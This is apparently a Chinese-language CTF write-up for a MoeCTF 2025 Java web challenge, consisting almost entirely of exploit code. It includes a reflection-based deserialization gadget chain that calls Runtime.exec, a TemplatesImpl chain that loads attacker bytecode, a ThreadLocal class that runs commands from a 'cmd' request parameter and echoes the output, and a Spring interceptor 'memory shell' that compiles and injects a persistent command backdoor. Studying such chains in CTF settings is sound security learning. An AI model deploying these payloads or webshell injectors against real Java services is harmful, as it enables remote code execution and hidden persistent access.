---
title: 2025Moectf-Web-23章
toc: true
categories:
  - ctf
date: 2025-09-20 23:10:12
tags:
  - java
  - ctf
---

非常基础的java反序列化，大概能知道java反射，类加载，urldns链基本就可以

因为题目不出网，23章提供跳板机反弹shell, 附加挑战只能用回显技术打

### 反弹shell

调用链HashMap#readObject()->DogService#chainWagTail()->Dog#wagTail()

#### exp1: 

```java
import com.example.demo.Dog.Dog;
import com.example.demo.Dog.DogService;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class Exp {
    public static String serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
    public static void deserialize(String base64Data) throws IOException,ClassNotFoundException {
        ByteArrayInputStream bais=new ByteArrayInputStream(Base64.getDecoder().decode(base64Data));
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();


    }
    public static Dog setDog(Object i,String m,Class[] p,Object[] a) throws NoSuchFieldException,IllegalAccessException{
        Dog dog = new Dog(2,"sss,","sss",2);
        Field input = Dog.class.getDeclaredField("object");
        input.setAccessible(true);
        input.set(dog,i);
        Field methodName=Dog.class.getDeclaredField("methodName");
        methodName.setAccessible(true);
        methodName.set(dog,m);
        Field paramTypes=Dog.class.getDeclaredField("paramTypes");
        paramTypes.setAccessible(true);
        paramTypes.set(dog,p);
        Field arg =Dog.class.getDeclaredField("args");
        arg.setAccessible(true);
        arg.set(dog,a);
        return dog;
    }


    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        Map<Object, Object> map = new HashMap<>();
        Dog dog1 = setDog(Runtime.class,"getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null});
        Dog dog2 = setDog(Runtime.class,"invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null});
        Dog dog3 = setDog(Runtime.class,"exec", new Class[]{String.class}, new Object[]{"calc"});
        DogService dogService = new DogService();
        Field dogs = dogService.getClass().getDeclaredField("dogs");
        dogs.setAccessible(true);
        Map<Integer, Dog> dogs2 = (Map<Integer, Dog>) dogs.get(dogService);

        Dog dog4 = setDog(dogService,"chainWagTail",new Class[]{},new Object[]{});

        dogs2.put(1,dog1);
        dogs2.put(2,dog2);
        dogs2.put(3,dog3);
        map.put(dog4,"ssss");

        String aa=serialize(map);
        System.out.println(aa);
        deserialize(aa);


    }
}
```



TemplatesImpl动态加载类，恶意类也可以反弹shell, 这里只用来研究回显，当然还有其他的回显技术

### 回显技术 (附加挑战的exp)

HashMap#readObject()->Dog#wagTail()->Templateslmpl#newTransformer0->Templateslmpl#getTransletlnstance0->Templateslmpl#defineTransletClasses0->Templateslmpl.TransletClassLoadler#defineClass()->ClassLoader#defineclass0

#### exp2:

```java
//Exp.java
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

import java.util.Base64;


import com.example.demo.Dog.Dog;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;


public class Exp {
    public static String serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
    public static void deserialize(String base64Data) throws IOException,ClassNotFoundException {
        ByteArrayInputStream bais=new ByteArrayInputStream(Base64.getDecoder().decode(base64Data));
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();


    }


    public static void setField(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {


        byte[] evilBytecode = Files.readAllBytes(Paths.get("E:\\demo3\\target\\classes\\Inject_ThreadLocal.class"));

        TemplatesImpl templates = new TemplatesImpl();
        setField(templates, "_bytecodes", new byte[][] { evilBytecode });
        setField(templates, "_name", "aaa");
        setField(templates, "_tfactory", new TransformerFactoryImpl());


        Dog dog = new Dog(2,"sss,","sss",2);


        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(dog,null);
        setField(dog, "object", templates);
        setField(dog, "methodName", "newTransformer");
        setField(dog, "paramTypes", new Class[0]);
        setField(dog, "args", new Object[0]);

        String a = serialize(hashMap);

        System.out.println(a);


    }
}
```

###### ThreadLocal回显

```java
//Inject_ThreadLocal.java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.core.ApplicationFilterChain;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Scanner;

public class Inject_ThreadLocal extends AbstractTranslet {

    static {
        try {

            //反射获取所需属性
            java.lang.reflect.Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            java.lang.reflect.Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            java.lang.reflect.Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");

            //使用modifiersField反射修改final型变量
            java.lang.reflect.Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);
            WRAP_SAME_OBJECT_FIELD.setAccessible(true);
            lastServicedRequestField.setAccessible(true);
            lastServicedResponseField.setAccessible(true);

            //将变量WRAP_SAME_OBJECT_FIELD设置为true，并初始化lastServicedRequest和lastServicedResponse变量
            if (!WRAP_SAME_OBJECT_FIELD.getBoolean(null)) {
                WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);
            }

            if (lastServicedRequestField.get(null) == null) {
                lastServicedRequestField.set(null, new ThreadLocal<>());
            }

            if (lastServicedResponseField.get(null) == null) {
                lastServicedResponseField.set(null, new ThreadLocal<>());
            }
            ServletRequest servletRequest=null;
            if(lastServicedRequestField.get(null)!=null) {

                ThreadLocal threadLocal = (ThreadLocal) lastServicedRequestField.get(null);
               servletRequest = (ServletRequest) threadLocal.get();
            }

            //获取response变量
            if (lastServicedResponseField.get(null) != null) {
                ThreadLocal threadLocal = (ThreadLocal) lastServicedResponseField.get(null);
                ServletResponse servletResponse = (ServletResponse) threadLocal.get();
                PrintWriter writer = servletResponse.getWriter();
                Scanner scanner = new Scanner(Runtime.getRuntime().exec(servletRequest.getParameter("cmd")).getInputStream()).useDelimiter("\\A");
                String result = scanner.hasNext()?scanner.next():"";
                scanner.close();
                writer.write(result);
                writer.flush();
                writer.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```



###### Interceptor内存马

```java
//Inject_ThreadLocal.java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;

import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;

import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;


import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.tools.*;
import java.io.*;

import java.lang.reflect.Field;

import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.*;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;


public class Inject_ThreadLocal extends AbstractTranslet {
    public static Class<?> createShellInterceptor() throws Exception {
        String className = "DynamicShellInterceptor";
        String packageName = "com.dynamic.generated";
        String fullClassName = packageName + "." + className;

        String sourceCode = buildShellSourceCode(packageName, className);

        // 创建临时目录
        Path tempDir = Files.createTempDirectory("dynamic_classes");
        Path sourceDir = tempDir.resolve("src");
        Path classDir = tempDir.resolve("classes");
        Files.createDirectories(sourceDir);
        Files.createDirectories(classDir);

        // 写入源码文件
        Path sourceFile = sourceDir.resolve(className + ".java");
        Files.write(sourceFile, sourceCode.getBytes());

        // 编译
        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
        DiagnosticCollector<JavaFileObject> diagnostics = new DiagnosticCollector<>();

        try (StandardJavaFileManager fileManager = compiler.getStandardFileManager(diagnostics, null, null)) {
            Iterable<? extends JavaFileObject> compilationUnits =
                fileManager.getJavaFileObjects(sourceFile.toFile());

            File tempLibDir = Files.createTempDirectory("boot-libs").toFile();
            String bootInfClasspath = extractBootInfLibs(new File("/app/demo.jar"), tempLibDir);

            List<String> options = Arrays.asList(
                "-d", classDir.toString(),
                "-classpath", bootInfClasspath
            );





            JavaCompiler.CompilationTask task = compiler.getTask(
                null, fileManager, diagnostics, options, null, compilationUnits);

            if (!task.call()) {
                throw new RuntimeException("编译失败: " + diagnostics.getDiagnostics());
            }

            // 加载类
            URLClassLoader classLoader = new URLClassLoader(
                new URL[]{classDir.toUri().toURL()},
                Inject_ThreadLocal.class.getClassLoader()
            );

            return classLoader.loadClass(fullClassName);
        } finally {
            // 清理临时文件

        }
    }
    public static String extractBootInfLibs(File bootJar, File extractToDir) throws IOException {
        List<String> jarPaths = new ArrayList<>();

        try (JarFile jarFile = new JarFile(bootJar)) {
            Enumeration<JarEntry> entries = jarFile.entries();

            while (entries.hasMoreElements()) {
                JarEntry entry = entries.nextElement();
                if (entry.getName().startsWith("BOOT-INF/lib/") && entry.getName().endsWith(".jar")) {
                    // 提取JAR文件
                    String jarName = entry.getName().substring("BOOT-INF/lib/".length());
                    File outputJar = new File(extractToDir, jarName);

                    // 确保父目录存在
                    outputJar.getParentFile().mkdirs();

                    try (InputStream is = jarFile.getInputStream(entry);
                         OutputStream os = new FileOutputStream(outputJar)) {
                        // 使用传统的流复制方法
                        byte[] buffer = new byte[8192];
                        int bytesRead;
                        while ((bytesRead = is.read(buffer)) != -1) {
                            os.write(buffer, 0, bytesRead);
                        }
                    }

                    jarPaths.add(outputJar.getAbsolutePath());
                }
            }
        }

        return String.join(File.pathSeparator, jarPaths);
    }

    private static String buildShellSourceCode(String packageName, String className) {
        return "package " + packageName + ";\n\n" +
            "import javax.servlet.http.HttpServletRequest;\n" +
            "import javax.servlet.http.HttpServletResponse;\n" +
            "import org.springframework.web.servlet.HandlerInterceptor;\n" +
            "import org.springframework.web.servlet.ModelAndView;\n" +
            "import java.io.PrintWriter;\n" +
            "import java.util.Scanner;\n\n" +
            "public class " + className + " implements HandlerInterceptor {\n\n" +
            "    @Override\n" +
            "    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n" +
            "        String cmd = request.getParameter(\"cmd\");\n" +
            "        if (cmd != null && !cmd.trim().isEmpty()) {\n" +
            "            try {\n" +
            "                Process process = Runtime.getRuntime().exec(cmd);\n" +
            "                PrintWriter writer = response.getWriter();\n" +
            "                Scanner scanner = new Scanner(process.getInputStream()).useDelimiter(\"\\\\A\");\n" +
            "                String result = scanner.hasNext() ? scanner.next() : \"\";\n" +
            "                scanner.close();\n" +
            "                writer.write(result);\n" +
            "                writer.flush();\n" +
            "                writer.close();\n" +
            "                return false; // 不再继续执行后续拦截器\n" +
            "            } catch (Exception e) {\n" +
            "                e.printStackTrace();\n" +
            "            }\n" +
            "        }\n" +
            "        return true; // 继续执行后续拦截器\n" +
            "    }\n\n" +
            "    @Override\n" +
            "    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {\n" +
            "        // 可选的后处理逻辑\n" +
            "    }\n\n" +
            "    @Override\n" +
            "    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {\n" +
            "        // 清理资源\n" +
            "    }\n" +
            "}";
    }
    static {
        try {
            //获取当前上下文环境
//        WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

            // 通过 context 获取 RequestMappingHandlerMapping 对象
            AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping) context.getBean(RequestMappingHandlerMapping.class);
            Field field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            ArrayList<Object> adaptedInterceptors = (ArrayList<Object>) field.get(abstractHandlerMapping);
            Class<?> shellClass = createShellInterceptor();
            adaptedInterceptors.add(shellClass.newInstance());
        }catch (Exception e){
            e.printStackTrace();
        }

    }


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

}






```